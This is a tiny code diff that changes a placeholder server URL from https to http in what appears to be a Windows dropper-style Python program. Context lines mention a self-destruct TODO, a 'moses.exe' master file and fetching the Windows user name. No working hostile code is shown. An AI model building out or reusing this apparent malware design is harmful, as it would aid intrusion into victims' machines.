@@ -23,7 +23,7 @@ def main():
         # TODO: implement a self-destruct function if 32-bit? (maybe)
         pass
 
-    URL = "https://website.tld" #NO SLASH AT THE END OF THE URL
+    URL = "http://website.tld" #NO SLASH AT THE END OF THE URL
     master_filename = "moses.exe"
 
     win_user = get_win_user()
